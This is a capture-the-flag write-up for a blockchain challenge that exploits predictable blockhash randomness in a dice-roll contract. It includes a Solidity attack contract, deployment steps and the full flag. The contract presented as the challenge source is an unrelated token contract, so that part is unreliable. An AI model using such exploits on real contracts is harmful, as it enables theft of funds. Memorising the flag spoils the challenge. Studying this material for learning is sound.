## Challenge Name: Dice Roll 擲骰仔
Category: Blockchain<br>
Points: 453<br>
Solves: 17<br>

Challenge Description: <br>

I bet you can't guess it.<br>
我賭你估唔到。<br>
http://chal.polyuctf.com:11337/<br>
Flag format 格式: PUCTF24{xxx}<br>
Author 作者: Sunny<br>

### Approach

1. Chick Get new Instance & Get the instance

   
1. Open [Remix - Ethereum IDE](https://remix.ethereum.org/#lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.24+commit.e11b9ed9.js)--> open a new .sol file --> copy the code from [Dice Roll](http://chal.polyuctf.com:11337/level/0x0A14079e1215a4758Aa0215B50581A225930f721)

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PolyUBlueCoin {

  mapping(address => uint) balances;
  uint public totalBank;

  constructor(uint _initialBank) public {
    balances[msg.sender] = totalBank = _initialBank;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```
<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/copy.png" border="0">

3. Setup the attack Code
```
contract Attact{
    DiceRoll anit_roll = DiceRoll(<Instance address>);
    uint256 ram = 2023;

    function attact() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 diceRoll = blockValue / ram % 6;

        anit_roll.roll(diceRoll);
    }
}
```
<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/add_attack.png?raw=true" border="0">

5. Compile --> change environment --> deploy --> attact
<p align="left">
<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/environment.png" width="320" height="900">
   
<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/deploy.png" width="320" height="900">

<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/attack.png" width="320" height="900">
</p>
After you chick attack, you may check the times of suesses by code below

```
fromWei(await contract.consecutiveWins())
```

<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/check.png" border="0">

7. Flag
- After trying 10 times

<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/enter_10times.png" border="0">

- Chick Submit instance and get the flag
<img src="https://github.com/Mini-Touch/Dice-Roll-writeup-PolyU-x-NuttyShell-Cybersecurity-CTF-2024/blob/main/Png%20Folder/flag.png" border="0">

### Flag
Flag: PUCTF24{n0_r3n4omn3ss_1n_bl0ckch41n_vuLptYG7wexbBQ8ZvtYhGU2MdW4uT7po}

### Reference
https://ctf-wiki.org/blockchain/ethereum/attacks/randomness/
https://www.youtube.com/watch?v=YGIDhidOwFM
https://ethernaut.openzeppelin.com/
---
[Back to home](<link>)
